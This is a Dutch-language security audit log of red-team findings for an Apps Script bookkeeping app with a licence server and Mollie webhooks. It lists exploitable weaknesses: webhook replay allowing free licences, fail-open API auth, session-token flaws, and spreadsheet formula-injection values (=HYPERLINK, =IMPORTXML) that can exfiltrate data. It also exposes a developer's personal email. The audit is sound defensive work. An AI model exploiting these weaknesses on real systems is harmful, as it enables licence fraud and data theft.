# Audit-findings — red-team-adversary
Hashes van gelezen file-versies: zie tmp/file-hashes.txt.

## Batch RED-A — licence-server/Code.gs, licence-server/AdminDashboard.gs, src/Licentie.gs, src/Mollie.gs

### licence-server/Code.gs
Gelezen: regels 1-3680
Aspecten:
- SSRF: OK 553, 625, 919, 1126, 2049, 3073 — bestemmingen hardcoded (api.mollie.com, api.brevo.com) of Drive-blob; updateBundleEndpoint_ leest owner-property, geen request-input.
- RCE: OK 581, 630, 1051-1057, 1128, 1134 — JSON.parse alleen op Mollie/Brevo-respons en owner-properties; geen eval/Function.
- IDOR: VONDST F-RED-002 (telemetry), verder OK.
- Auth-bypass: VONDST F-RED-001 (webhook-replay/mode-gat), F-RED-003 (admin-legacy rate-limit self-DoS).
- Timing: OK 193-202, 840, 1437, 2830, 3240 (veiligVergelijk_ constant-time, overal gebruikt).
- Secret-leakage: OK 1027-1030, 2642-2647, 2872-2876 (err.message niet naar buiten; secrets max 8-char-prefix gelogd).
- HTML-injection: OK 1596-1602, 1755-1763, 3049 (escHtml_ + saneerNaam_).
- Mollie-webhook: VONDST F-RED-001. Replay/rate-limit/mail: VONDST F-RED-004.
- Prototype pollution: OK 3467, 3470 (Object.assign met server-stats).

### licence-server/AdminDashboard.gs
Gelezen: regels 1-1218
Aspecten:
- SSRF: F-RED-005 (vaste host, geen exploit). RCE: OK 306, 572. IDOR: OK 284-287 (allowlist _adminConfigSchema_).
- Auth-bypass/replay: VONDST F-RED-006 (sessie-token zonder her-binding; CacheService-only). Timing: OK 103, 122.
- Secret-leakage: OK 171-178 (masking). HTML-injection: OK (client-side esc()). Webhook/pollution: n.v.t.

### src/Licentie.gs
Gelezen: regels 1-967
Aspecten:
- SSRF: OK 564, 589, 701, 785, 810, 835 (owner-property URL + encodeURIComponent). RCE: OK 694, 708, 966.
- IDOR/timing/webhook/replay/pollution: n.v.t. Auth-bypass: VONDST F-RED-007 (offline-grace). Secret: OK 943. HTML: F-RED-008 (gecontroleerd veilig, textContent).

### src/Mollie.gs
Gelezen: regels 1-453
Aspecten:
- SSRF: OK 94, 278, 284 (vaste host; paymentId regex /^tr_[a-zA-Z0-9]{8,}$/). RCE: OK 130, 292. IDOR: OK 332-347.
- Auth-bypass/webhook: VONDST F-RED-009, F-RED-010. Timing: OK 242-244. Secret: OK. HTML: OK 194 (escHtml_). Replay: OK 257, 389-403 (dual-layer idempotency). Pollution: OK 366.

#### F-RED-001 [HOOG] licence-server/Code.gs:606-608, 676-681
Quote: `const paymentId = e && e.parameter && e.parameter.id; if (!paymentId) return;` ... `const verwachteMode = String(mollieKey).startsWith('live_') ? 'live' : 'test'; if (betaling.mode !== verwachteMode) { ... return; }`
Probleem: Mollie-webhook authenticeert afzender niet (iedereen kan POST ?id=tr_xxx sturen); bescherming = server haalt status zelf op + mode/bedrag-guard. In test-modus (MOLLIE_API_KEY=test_, admin test-modus zet prijs €0,01, regel 1480) is verwachteMode='test' en minPrijs=0,01: aanvaller met een willekeurig betaald test-payment-id op dezelfde account kan gratis echte licentie laten provisionen met zelfgekozen metadata.email.
Fix: webhook-shared-secret als query-param (Brevo-patroon, regel 3234) verplicht; provisioning in test-modus blokkeren.
Owner: Sam (dev)

#### F-RED-002 [MIDDEL] licence-server/Code.gs:1184-1219
Quote: `const sleutel = String((e.parameter.sleutel || '')).trim().toUpperCase();` ... `tel.appendRow([new Date(), hash, code, bericht, versie]);`
Probleem: telemetryEndpoint_ ongeauthenticeerd; geen sleutel-bestaanscontrole; rate-limit (hash,code) 1×/u omzeilbaar door code te variëren ⇒ Telemetry-tab vol te schrijven tot trim-grens (5000, regel 1219), echte telemetrie weggeduwd; bericht-veld kan formula-injection bevatten (=HYPERLINK...).
Fix: sleutel-bestaanscontrole vóór write; tekstvelden beginnend met =+-@ prefixen met apostrof.
Owner: Sam (dev)

#### F-RED-003 [MIDDEL] licence-server/Code.gs:77-89
Quote: `if (actie === 'admin-legacy') { if (_adminNoodsleutelOk_(e)) { ... } const blocked = rateLimit_(e, { actie: 'admin-login', globaal: 20, windowMin: 60 });`
Probleem: rate-limit globaal 20/u zonder per-IP-partitie (GAS heeft geen IP) ⇒ aanvaller kan owner uitsluiten (self-DoS); noodsleutel-bypass hangt af van crit-config (3403) die default ontbreekt ⇒ permanente self-DoS-vector.
Fix: ADMIN_NOODSLEUTEL harde setup-vereiste, of teller per wachtwoord-hash partitioneren.
Owner: Sam (dev)

#### F-RED-004 [MIDDEL] licence-server/Code.gs:41-43, 2514-2519
Quote: `const email = String((e && e.parameter && e.parameter.email) || '').trim().toLowerCase(); if (email && opties.perEmail) { const ek = 'rl_' + actie + '_e_' + _rlHash_(email); ...}`
Probleem: per-identiteit-rate-limit op aanvaller-gekozen email; herstuur-licentie (3/email/u + 200 globaal) en activeer-otp (12/email/u + 500 globaal) per-email-laag triviaal omzeilbaar met geroteerde adressen ⇒ Brevo-quota-uitputting via globale caps (mail-bombing van één adres wel geremd op 3/u).
Fix: globale caps voor mail-acties verlagen of proof-of-work/captcha op publieke OTP-aanvraag.
Owner: Sam (dev)

#### F-RED-005 [LAAG] licence-server/AdminDashboard.gs:635-637
Quote: `const resp = UrlFetchApp.fetch('https://www.boekhoudbaar.nl/' + slug + '/', { muteHttpExceptions: true, followRedirects: true });`
Probleem: slug uit hardcoded array ['kopen','bedankt'] (631) ⇒ geen user-controlled SSRF; achter sessie-auth. Gecontroleerd, geen exploit.
Fix: geen actie.
Owner: Sam (dev)

#### F-RED-006 [MIDDEL] licence-server/AdminDashboard.gs:128-143, 533-540
Quote: `const token = Utilities.getUuid().replace(/-/g, ''); cache.put(ADMIN_SESSIE_PREFIX + token, '1', ADMIN_SESSIE_TTL_SEC);`
Probleem: admin-sessie-token niet gebonden aan wachtwoord-versie; na wachtwoord-wijziging blijven tokens 6u geldig; sliding-window TTL maakt gestolen token onbeperkt verlengbaar; token-diefstal = volledige admin incl. Mollie-key-vervanging via adminZetConfig.
Fix: token binden aan ADMIN_WACHTWOORD-versiestempel; sessies invalideren bij wijziging; absolute max-leeftijd.
Owner: Sam (dev)

#### F-RED-007 [HOOG] src/Licentie.gs:822-829, 875-902
Quote: `if (!serverUrl) { Logger.log('WAARSCHUWING: Geen licentieserver — licentie geaccepteerd zonder validatie.'); return { geldig: true, naam: 'Demo', versie: 'Demo' }; }`
Probleem: (1) ontbrekende LICENTIE_SERVER_URL ⇒ geldig:true. (2) offline-grace default 90 dagen, klant-overschrijfbaar tot 3650 via LICENTIE_GRACE_DAGEN (regel 49) ⇒ klant die property op 3650 zet en server blokkeert na refund houdt ~10 jaar toegang; server-revoke wist LICENTIE_LAATST_GELUKT_KEY (852) alleen als server nog één keer bereikt wordt. (3) isEigenaarBypass_ hardcodeert samhoven16@gmail.com (83) — beperkt risico.
Fix: grace-cap verlagen (3650→~30); LICENTIE_GRACE_DAGEN niet klant-overschrijfbaar; laatst-gelukt server-side meetekenen.
Owner: Sam (dev)

#### F-RED-008 [LAAG] src/Licentie.gs:466-468
Quote: `document.getElementById('succes_naam').textContent = res.naam ? 'Welkom, ' + res.naam + '.' : '';`
Probleem: gecontroleerd — textContent + saneerNaam_ bij opslag; geen XSS. Volledigheidsvondst, pad veilig.
Fix: geen actie.
Owner: Sam (dev)

#### F-RED-009 [HOOG] src/Mollie.gs:231-249
Quote: `const secret = ontsleutelString_(...MOLLIE_WEBHOOK_SECRET_PROP...); if (secret) { ... }` (signature-blok volledig binnen if (secret))
Probleem: signature-verificatie alleen actief mét MOLLIE_WEBHOOK_SECRET; Mollie ondertekent webhooks zelf niet ⇒ in default-config wordt elke POST {id:tr_...} geaccepteerd zodra payment paid is. Echte gate = metadata/bedrag-verificatie (320-348), solide tegen vreemde betalingen; restrisico vroege replay door derde; signature-verdediging is dode code in default-config.
Fix: documenteren dat metadata/bedrag-gate de beveiliging is of misleidende signature-tak verwijderen; verplichte query-token op webhook-URL (Brevo-patroon).
Owner: Sam (dev)

#### F-RED-010 [LAAG] src/Mollie.gs:304-309
Quote: `if (status !== 'paid' || !factuurnummer) { ... return { succes: true, status: status }; }`
Probleem: factuur-betaal-webhook verwerkt geen refund/chargeback (licence-server doet dat wél, Code.gs:651-664) ⇒ verkoopfactuur blijft ten onrechte 'betaald' na terugbetaling. Data-integriteit, geen security richting Sam.
Fix: amountRefunded/amountChargedBack verwerken analoog aan licence-server.
Owner: Sam (dev)

Prioriteit RED-A: F-RED-001/009 (webhook-authenticatie), F-RED-007 (grace-override), F-RED-006 (sessie-binding), F-RED-003/004/002 (DoS/quota/telemetry).

## Batch RED-B — API, AccountVerwijderen, Assistent, BankImport, BoekingEngine, Brand, Branding, Changelog

### src/API.gs — Gelezen: 1-492. SSRF OK; RCE OK (safeJsonParse_ 489-492); IDOR OK; timing OK (veiligVergelijkApi_ 463-471); CSV-injectie OK (saniteerObject_ 98-99); pollution OK (85-93); replay OK (41, 62-76, 198-210). VONDSTEN F-RED-020..022.
### src/AccountVerwijderen.gs — Gelezen: 1-287. SSRF OK (owner-URL + encodeURIComponent); OTP server-side; audit met SHA-256-hash i.p.v. e-mail (217, 229-237). VONDST F-RED-023.
### src/Assistent.gs — Gelezen: 1-210. Geen IO/endpoints; escHtml_ op bedrijf (147); FAQ hard-coded. Geen vondsten.
### src/BankImport.gs — Gelezen: 1-547. Preview escaped client-side (526, 544-545); dedup tegen dubbel-boeken (303-346). VONDST F-RED-024.
### src/BoekingEngine.gs — Gelezen: 1-1086. SSRF OK (Gemini-host vast); saniteer_ + pollution-bescherming (52-67, 78-93, 684-687); AI-rate-limit (588-594). VONDSTEN F-RED-025..027.
### src/Brand.gs — Gelezen: 1-104. Statische design-tokens; alle aspecten n.v.t. Geen vondsten.
### src/Branding.gs — Gelezen: 1-455. Upload-pad voorbeeldig (MIME-whitelist + magic bytes + size-cap + SVG geweigerd, 49-78); textContent (304); dataUrl-regex (340, 358). Geen vondsten.
### src/Changelog.gs — Gelezen: 1-199. Statische entries + escHtml_ (144-148); throttle (106-117); numerieke semver (83-94). Geen vondsten.

#### F-RED-020 [MIDDEL] src/API.gs:148-155
Quote: `const apiSleutel = getInstelling_('Webhook API sleutel'); if (apiSleutel) { ... }`
Probleem: fail-open auth — lege sleutel ⇒ check overgeslagen ⇒ anonieme GET ?actie=klanten lekt volledige klantenlijst (162-168) en ?actie=facturen laatste 20 facturen (171-178); anonieme POST kan boeken (doPost regel 83 zelfde patroon). Sleutel wordt normaal auto-gegenereerd (AutoDefaults:81) maar klant kan veld legen / UUID-fallback (AutoDefaults:84) kan falen.
Fix: fail-closed voor data-ontsluitende/schrijvende acties: weigeren zonder geconfigureerde sleutel of HMAC.
Owner: Sam (dev)

#### F-RED-021 [LAAG] src/API.gs:134-137
Quote: `return jsonResponse_({ succes: false, fout: err.message });`
Probleem: rauwe err.message naar externe caller (ook 255, 287, 310) ⇒ recon-lek van interne structuur/paden.
Fix: generieke melding + correlatie-id extern; details alleen server-side.
Owner: Sam (dev)

#### F-RED-022 [LAAG] src/API.gs:388-389
Quote: `<div class="url-box">${webAppUrl}</div> ${webAppUrl.includes('XXXXXX') ? ... }`
Probleem: webAppUrl/apiSleutel (401, 421) ongeëscaped in dialog-HTML (waarden uit klant-bewerkbare Instellingen-sheet) ⇒ self-XSS; plaintext key in modal.
Fix: escHtml_ vóór interpolatie.
Owner: Sam (dev)

#### F-RED-023 [LAAG] src/AccountVerwijderen.gs:82-83
Quote: `<input type="email" id="email" value="${ingevuldEmail}" ...>` + `${klantnaam ? 'Licentiehouder: ' + klantnaam : ''}`
Probleem: ongeëscapete interpolatie (self-XSS; defense-in-depth ontbreekt t.o.v. Assistent/Changelog).
Fix: escHtml_ op beide.
Owner: Sam (dev)

#### F-RED-024 [MIDDEL] src/BankImport.gs:90-97 + 365-381
Quote: `omschr: String(omschrRw || '').replace(/^"|"$/g, '').trim(), ...`
Probleem: CSV-velden (omschr/tegenpartij/tegenrekening/referentie) zonder saniteer_ via setValues (402-403) in BANKTRANSACTIES ⇒ formula-injectie: aanvaller stuurt betaling met geprepareerde omschrijving (=HYPERLINK(...)) die in de sheet/exports landt. API.gs en BoekingEngine saniteren wél; dit pad omzeilt het.
Fix: saniteer_ op de vier velden vóór push (365-381) of in parseBankCsv_ (90-97).
Owner: Sam (dev)

#### F-RED-025 [LAAG] src/BoekingEngine.gs:643
Quote: `const json = JSON.parse(resp.getContentText());`
Probleem: kale JSON.parse + ongeguarde deref van json.candidates[0]... (648, 793) — functioneel afgevangen door omhullende try/catch (668, 796); geen RCE; alleen onnette fout op eigen flow.
Fix: optionele null-guards voor nettere melding.
Owner: Sam (dev)

#### F-RED-026 [MIDDEL] src/BoekingEngine.gs:630
Quote: `'https://generativelanguage.googleapis.com/v1beta/models/' + _geminiModel_() + ':generateContent?key=' + apiKey,`
Probleem: Gemini-key als query-param (ook 783) ⇒ log-lek-risico (execution-logs, error-traces met volledige URL).
Fix: x-goog-api-key-header; checken dat geen catch de URL logt.
Owner: Sam (dev)

#### F-RED-027 [LAAG] src/BoekingEngine.gs:859-861, 938
Quote: `const entry = lockHeld ? entryBase + ' | ' + entryHash.slice(0, 16) : entryBase + ' | NOLOCK'; ... if (opgeslagenSuffix === 'NOLOCK') continue;`
Probleem: verifier slaat NOLOCK-entries over zonder prevHash-wijziging ⇒ klant met Editor-rechten kan tampering maskeren door hash-suffix te vervangen door 'NOLOCK'; anchor-sheet (1053-1082) mitigeert eind-hash-reset, niet midden-buffer-maskering. Bekende beperking (862-867).
Fix: NOLOCK-aandeel rapporteren en bij abnormaal aandeel waarschuwen.
Owner: Sam (dev)

## Batch RED-C — BTW, BTWReminder, Bankboek, BelastingOptimizer, Belastingvoordeel, Boekingen, BtwExport, Config

### src/BTW.gs — Gelezen: 1-922. Geen UrlFetch/eval; JSON.parse op eigen property in try/catch (725); replay OK (192-197, 269). VONDST F-RED-040.
### src/BTWReminder.gs — Gelezen: 1-305. Dialog interpoleert alleen statische namen + getallen; dubbele-mail-guard persistent (67-71, 134-135). Geen vondsten.
### src/Bankboek.gs — Gelezen: 1-185. Dialog statisch; Object.fromEntries op vaste form-velden (124). Deelt F-RED-041 (omschr-pad).
### src/BelastingOptimizer.gs — Gelezen: 1-288. Statische dialog; textContent (281); geen sheet-writes. Geen vondsten.
### src/Belastingvoordeel.gs — Gelezen: 1-1146. Dialogs interpoleren alleen getallen; data.omschr via textContent (556). Deelt F-RED-041. Observatie: boekReiskostenWeek geen idempotentie (klant-tegen-zichzelf).
### src/Boekingen.gs — Gelezen: 1-1481. Storno-dubbeldetectie (217-226), locks (375-384, 1028-1093), compensating rollback OK. VONDSTEN F-RED-041..043.
### src/BtwExport.gs — Gelezen: 1-326. periodeKey strikt gevalideerd (319); escHtml client-side (120-151); CSV alleen statische rubriek-namen + getallen (304-316) — correct ontworpen. Geen vondsten.
### src/Config.gs — Gelezen: 1-346. Declaratieve constanten; PROP bevat key-namen, geen secrets. Geen vondsten.

#### F-RED-040 [LAAG] src/BTW.gs:725
Quote: `try { snaps = JSON.parse(props.getProperty('BTW_SNAPSHOTS') || '{}'); }`
Probleem: klant met editor-toegang kan BTW_SNAPSHOTS herschrijven om de suppletie-detector te misleiden (threat 5-jaar-retroactieve-fraude). Geen RCE/pollution; inherente eigenschap van klant-eigen properties.
Fix: AUDIT_LOG-hash-chain als trust-anchor; documenteren dat snapshots niet bewijskrachtig zijn.
Owner: Sam (dev)

#### F-RED-041 [LAAG] src/Boekingen.gs:102
Quote: `opt.omschr || '',`
Probleem: maakJournaalpost_ schrijft vrije-tekst-omschrijving zonder saniteer_ (bestaat in BoekingEngine.gs:52); callers boekReiskosten (Belastingvoordeel.gs:591), boekReiskostenWeek (692), verwerkPriveCorrectie (Bankboek.gs:154) geven user-input door ⇒ =HYPERLINK/IMPORTRANGE als actieve formule in Journaalposten; genereerGrootboekkaart_ (644) kopieert verder. Zelf-toegebracht (single-tenant) maar exfiltratie-risico bij delen met accountant.
Fix: saniteer_(opt.omschr) (+ref/notities) in maakJournaalpost_ — dekt ~8 callers in één keer.
Owner: Sam (dev)

#### F-RED-042 [LAAG] src/Boekingen.gs:601
Quote: `const bladNaam = `GB_${code}`; ... sheet = ss.insertSheet(bladNaam);`
Probleem: zoekGrootboekNaam_ (1098-1101) retourneert bij onbekende code de code zelf ⇒ guard op 592 vangt niets ⇒ ongebreidelde sheet-creatie GB_<wat-dan-ook>.
Fix: bestaat-check tegen STANDAARD_GROOTBOEK; zoekGrootboekNaam_ null laten teruggeven.
Owner: Sam (dev)

#### F-RED-043 [LAAG] src/Boekingen.gs:712-718
Quote: `${vasteActiva.filter(...).map(r => `... <td>${r[1]}</td> ... name="${r[0]}"`)}`
Probleem: afschrijvingen-dialog interpoleert grootboek-code/naam zonder escHtml_; vandaag statisch (STANDAARD_GROOTBOEK) ⇒ geen werkende exploit, maar latente reflected-XSS zodra klant eigen rekeningnamen kan zetten.
Fix: escHtml_ om r[0]/r[1].
Owner: Sam (dev)

## Batch RED-D — DLQ, Dashboard, DataPortability, Diagnostiek, DriveStructuur, EUVerkoop, Engagement, ExportAccountant

### src/DLQ.gs — Gelezen: 1-282. JSON.parse in try/catch (91, 280); payload bewust niet in alert-mail (221). VONDSTEN F-RED-060, 061.
### src/Dashboard.gs — Gelezen: 1-1628. PDF-URL uit eigen ss.getId() (1046-1066); escaping client-side esc() (1601-1602). Geen vondsten.
### src/DataPortability.gs — Gelezen: 1-216. Instellingen-filter sluit secrets uit (124-127). VONDST F-RED-062.
### src/Diagnostiek.gs — Gelezen: 1-184. escHtml_ op executions-URL (110). VONDST F-RED-063 (misleidende allowlist-comment).
### src/DriveStructuur.gs — Gelezen: 1-480. Idempotente jaarafsluit-guard (295-305); archief-fail stopt vóór teller-reset (333-347). VONDST F-RED-064 (voorzorg).
### src/EUVerkoop.gs — Gelezen: 1-355. VIES-call encodeURIComponent + vaste host + format-check (91, 113) — bevestigd veilig (F-RED-065). VONDST F-RED-066.
### src/Engagement.gs — Gelezen: 1-409. escHtml_ op persoonlijkBericht/topKlant (208, 311). VONDSTEN F-RED-067, 068.
### src/ExportAccountant.gs — Gelezen: 1-1076. CSV-formula-guard + quote-escaping correct (818-826); bestandsnaam-sanitatie (48, 333). VONDSTEN F-RED-069..071.

#### F-RED-060 [LAAG] src/DLQ.gs:91
Quote: `try { payload = JSON.parse(data[i][2] || '{}'); } catch (_) {}`
Probleem: payload.opties wordt ongefilterd als GmailApp-opties doorgegeven (145) ⇒ gemanipuleerde rij (owner-bewerkbare hidden sheet) kan mail-headers beïnvloeden.
Fix: whitelist toegestane optie-velden. Owner: Sam (dev)

#### F-RED-061 [MIDDEL] src/DLQ.gs:99-117
Quote: `success = _dlqHandler_(type, payload);` ... `sheet.getRange(i + 1, 6).setValue('SUCCES');`
Probleem: dlqVerwerkRetries_ zonder lock; daily-trigger + forceerDlqRetry (195) gelijktijdig ⇒ beide verwerken zelfde PENDING-rij ⇒ dubbele factuur-/herinneringsmail naar klant; status-update pas ná handler.
Fix: script-lock of compare-and-set 'PROCESSING' vóór handler. Owner: Sam (dev)

#### F-RED-062 [LAAG] src/DataPortability.gs:96-99
Quote: `const jsonl = lijst.map(function(e) { return JSON.stringify(e); }).join('\n');`
Probleem: audit-JSONL exporteert alle rijen zonder PII-/secret-filter (vrije-tekst-details, bv. NPS-opmerkingen) — lekt bij doorsturen naar derde tool.
Fix: documenteren of gevoelige patronen filteren. Owner: Sam (dev)

#### F-RED-063 [LAAG] src/Diagnostiek.gs:39-43
Quote: `// Lichte HEAD naar een endpoint binnen onze allowlist ...` / `UrlFetchApp.fetch('https://api.kvk.nl/', ...)`
Probleem: comment claimt allowlist die niet bestaat — valse veiligheidsclaim voor latere ontwikkelaars; call zelf veilig (hardcoded).
Fix: comment corrigeren of echte allowlist-helper. Owner: Sam (dev)

#### F-RED-064 [LAAG] src/DriveStructuur.gs:159-169
Quote: `html += '<tr><td>' + m.label + '</td><td>' + link + '</td></tr>';`
Probleem: string-concat-HTML zonder escHtml_ — vandaag veilig (vaste labels + eigen Drive-URL) maar gevaarlijk patroon zodra label uit instellingen komt.
Fix: escHtml_ op href als voorzorg. Owner: Sam (dev)

#### F-RED-065 [LAAG] src/EUVerkoop.gs:113-120
Quote: `const url = VIES_API_BASE + encodeURIComponent(land) + '/vat/' + encodeURIComponent(nummer);`
Probleem: enige user-input-driven UrlFetch in batch — bevestigd veilig (vaste host, encoding, format-check, 30d-cache). Geen actie; evt. rate-limit op VIES-quota. Owner: Sam (dev)

#### F-RED-066 [MIDDEL] src/EUVerkoop.gs:296
Quote: `sheet.getRange(r, 1, 1, 5).setValues([[a.btwNr, a.naam, ...]])`
Probleem: klantnaam/BTW-nr uit factuurrijen onbewerkt in ICP-rapport ⇒ formula-injectie (=HYPERLINK/IMPORTXML) in een rapport dat naar accountant/Belastingdienst gaat; exporteerAlsCsv_ heeft wél een guard, dit pad niet.
Fix: zelfde formula-guard vóór setValues of klantnaam bij invoer saniteren. Owner: Sam (dev)

#### F-RED-067 [MIDDEL] src/Engagement.gs:229-240
Quote: `function slaNpsResponseOp(score, opmerking) { ... props.setProperty(NPS_PROP_RESPONSE, JSON.stringify(responses)); }`
Probleem: publiek via google.script.run; mede-bewerker kan herhaald aanroepen ⇒ NPS-data-injectie + owner-mails (246-248) zonder auth-check.
Fix: by-design accepteren maar owner-notificaties throttlen. Owner: Sam (dev)

#### F-RED-068 [LAAG] src/Engagement.gs:245-248
Quote: `meldFataalAanOwner_('NPS_DETRACTOR', 'Score ' + score, { opmerking: String(opmerking || '').slice(0, 200) });`
Probleem: elke detractor/promoter-submit = directe owner-mail zonder throttle ⇒ quota-uitputting via loop (met F-RED-067).
Fix: max 1/uur via timestamp-property of batchen in dagelijkseTaken. Owner: Sam (dev)

#### F-RED-069 [MIDDEL] src/ExportAccountant.gs:188-200
Quote: `function verstuurSamenvattingAccountant(emailAccountant, persoonlijkBericht) { ... GmailApp.sendEmail(emailAccountant, ...) }`
Probleem: publiek aanroepbaar; mede-bewerker kan financiële samenvatting (omzet/winst/banksaldo/debiteuren, 211-215) naar willekeurig extern adres exfiltreren in één call; server valideert alleen e-mailformaat.
Fix: rate-limit + audit-log mét ontvanger; beperken tot geconfigureerd accountant-adres. Owner: Sam (dev)

#### F-RED-070 [LAAG] src/ExportAccountant.gs:204
Quote: `<h2 ...>${bedrijf}</h2>`
Probleem: bedrijf ongeëscaped in mail-htmlBody terwijl persoonlijkBericht (208) wél escHtml_ krijgt — inconsistent; owner-config dus self-impact.
Fix: escHtml_(bedrijf). Owner: Sam (dev)

#### F-RED-071 [MIDDEL] src/ExportAccountant.gs:94 (→ XafExport.gs)
Quote: `const xafXml = _bouwXafXml_(ss);`
Probleem: cross-ref — XML-escaping van dynamische velden moet in XafExport geverifieerd zijn. (Bevestigd door batch ACC-B: _xafEsc_ aanwezig, XafExport.gs:385-393 — hiermee AFGEDEKT, geen open risico.)
Fix: geen — afgedekt door ACC-B-verificatie. Owner: Sam (dev)

## Batch RED-E — FeedbackLoop, Fiscaal, Fortress, HerhalendeKosten, HitlValidatie, Inkoopfacturen, Menu, Metrics

### src/FeedbackLoop.gs — Gelezen: 1-165. Server-URL owner-property; anoniem licentie-id (SHA-256[0:12]); veld-voor-veld opbouw. VONDST F-RED-080.
### src/Fiscaal.gs — Gelezen: 1-446. Suppletie-melding idempotent (277-291). VONDSTEN F-RED-081, 082.
### src/Fortress.gs — Gelezen: 1-292. VONDST F-RED-083.
### src/HerhalendeKosten.gs — Gelezen: 1-517. Idempotency + lock OK (285, 333-377). VONDST F-RED-084.
### src/HitlValidatie.gs — Gelezen: 1-240. Dialog escaped alle velden (52-66); withLock_ (165-187). VONDST F-RED-085.
### src/Inkoopfacturen.gs — Gelezen: 1-165. escHtml_ overal; lock+idempotency+rollback (27-55). Geen vondsten.
### src/Menu.gs — Gelezen: 1-712. Licentie-gate beperkt menu; export altijd open (anti-lock-in, bewust). VONDSTEN F-RED-086, 087.
### src/Metrics.gs — Gelezen: 1-179. toonSysteemStatus maskeert secret-keys correct (96-104, dekt alle bekende keys); throttle 1×/u. VONDST F-RED-088.

#### F-RED-080 [LAAG] src/FeedbackLoop.gs:132-145
Quote: `UrlFetchApp.fetch(serverUrl + '?actie=feedback', { method: 'post', ... payload: JSON.stringify(veilig) });`
Probleem: fire-and-forget POST zonder rate-limit/idempotency ⇒ spam-vector richting owner-server/Brevo via herhaald google.script.run.
Fix: client-cooldown + server-side per-licentie-id rate-limit. Owner: Sam (dev)

#### F-RED-081 [LAAG] src/Fiscaal.gs:150
Quote: `'<div class="sub2">' + r.uitleg + '. Bij IB-tarief ...'`
Probleem: r.uitleg via innerHTML zonder escape — vandaag statisch opgebouwd, latente DOM-XSS bij bron-wijziging.
Fix: escapen of textContent. Owner: Sam (dev)

#### F-RED-082 [LAAG] src/Fiscaal.gs:371-378 — v.periode intern gegenereerd, geen actuele injectie; geen guard als vangnet. Fix: geen actie nu. Owner: Sam.

#### F-RED-083 [MIDDEL] src/Fortress.gs:140-171
Quote: `if (ed.getEmail() !== me.getEmail()) { try { prot.removeEditor(ed); } catch (_) {} }`
Probleem: Fortress ("Beveiligde modus", filosofie "wiskundig onveranderlijk") beschermt NIET tegen de owner zelf — owner houdt edit-rechten en kan protections/FORTRESS_MODE/trigger verwijderen ⇒ tegen threat #1b (retroactieve eigen-fraude) nul bescherming; label wekt valse tamper-evidence-indruk bij klant/accountant. (Sluit aan op F-ACC-001.)
Fix: communiceren als foutpreventie; echte tamper-evidence via extern anker.
Owner: Sam (dev) + accountant (communicatie)

#### F-RED-084 [MIDDEL] src/HerhalendeKosten.gs:247-260
Quote: `sheet.appendRow([ id, naam, String((data && data.leveranc) || ''), bedrag, ... (data && data.notities) || '', splitPct ]);`
Probleem: naam/leveranc/notities uit dialog zonder formula-guard naar sheet ⇒ =IMPORTDATA/HYPERLINK live in cel; lekt via accountant-export; naam ook in journaalpost-omschrijving (353).
Fix: =+-@-prefix-guard vóór appendRow. Owner: Sam (dev)

#### F-RED-085 [MIDDEL] src/HitlValidatie.gs:154-175
Quote: `function valideerBoekingRijen(rijIndexen) { ... sheet.getRange(rij, HITL_KOL_STATUS).setValue(HITL_STATUS_GEVALIDEERD); ...`
Probleem: client levert willekeurige rij-indexen; geen bounds-check, geen Concept-status-verificatie ⇒ klant kan via google.script.run willekeurige rijen valselijk "Gevalideerd" stempelen (incl. vervalste Gevalideerd-door) — ondermijnt precies de art. 52-claim van de HITL-feature (threat #1b).
Fix: server-side rij ∈ [2, lastRow] + huidige status === Concept vereisen. Owner: Sam (dev)

#### F-RED-086 [LAAG] src/Menu.gs:379-381, 585-586 — Google-form-URL ongeescaped in dialog (bron Google ⇒ geen exploit; discipline-gap). Fix: escapen. Owner: Sam.
#### F-RED-087 [LAAG] src/Menu.gs:519-521, 538
Quote: `const mimeType = bestandsnaam.toLowerCase().endsWith('.pdf') ? 'application/pdf' : 'image/' + (bestandsnaam.split('.').pop() || 'jpeg');`
Probleem: mimeType/extensie uit ongesaniteerde client-bestandsnaam; bon.svg ⇒ image/svg in eigen Drive (script-houdend bij direct openen); geen content-validatie.
Fix: extensie/mimetype-whitelist (jpg/png/pdf); extensie uit geschoonde naam. Owner: Sam (dev)

#### F-RED-088 [MIDDEL] src/Metrics.gs:154, 164
Quote: `const ctxJson = context ? JSON.stringify(context).slice(0, 1000) : '(geen)';` ... `'Context:\n' + ctxJson`
Probleem: meldFataalAanOwner_ mailt context/bericht ongemaskeerd (geen masking-laag zoals toonSysteemStatus) ⇒ latent plaintext-secret-lek naar owner-inbox, afhankelijk van discipline van elke caller.
Fix: zelfde masker-functie op bericht/context vóór mail/audit-log. Owner: Sam (dev)

Prioriteit RED-E: F-RED-085 (vervalsbare HITL-validatie) en F-RED-084 (formula-injectie richting accountant); F-RED-083 is belofte/realiteit-mismatch voor communicatie.

## Batch RED-F — MoneybirdImport, NieuweBoeking, Onboarding, Prive, Referral, ResilientExecutor, SmartCategorisatie, Triggers
Kernbevinding: dialog-pad is dubbel gesanitiseerd (saniteerObject_ + saniteer_), maar Form-/Import-paden roepen de handlers rechtstreeks aan met rauwe data. Expliciet veilig bevonden: NieuweBoeking (hex-kleur, _esc, escHtml client-side, submit-sanitisatie), Referral (hash-refcode, encodeURIComponent), ResilientExecutor, SmartCategorisatie (statische config-writes; __proto__-key op JSON-object niet exploitabel).

#### F-RED-100 [HOOG] src/MoneybirdImport.gs:137-150 (idem 191-206)
Quote: `relatiesSheet.appendRow([ id, naam, _xafTekst_(klant,'streetAddress',ns)||'', ... ]);`
Probleem: XAF-velden (custName/adres/email/taxRegIdent/desc) ongesanitiseerd naar RELATIES/VERKOOPFACTUREN ⇒ vijandige XAF met =IMPORTXML/HYPERLINK = formula-injectie + exfiltratie; reist mee naar accountant-export.
Fix: elk stringveld door saniteer_() vóór appendRow. Owner: Sam (dev)

#### F-RED-101 [MIDDEL] src/Onboarding.gs:184,190,224
Quote: `<input id="geboortedatum" type="date" value="${huidig.geboortedatum || ''}">`
Probleem: 3 settings-waarden ongeëscaped in value-attribuut (regel 196 escaped wél) ⇒ stored XSS via mede-bewerker die Instellingen-cel bewerkt.
Fix: escHtml_ zoals regel 196. Owner: Sam (dev)

#### F-RED-102 [MIDDEL] src/Onboarding.gs:306 (× Setup.gs:1267-1280)
Quote: `try { setInstelling_(naam, waarde); }`
Probleem: dialog-invoer ongesanitiseerd naar Instellingen (setInstelling_ saniteert niet) ⇒ formule actief in Instellingen-sheet.
Fix: saniteer_ centraal in setInstelling_. Owner: Sam (dev)

#### F-RED-103 [LAAG] src/Prive.gs:219-227 — omschr/categorie/rekening ongesanitiseerd naar Privé-blad (zelf-/accountant-target). Fix: saniteer_. Owner: Sam.
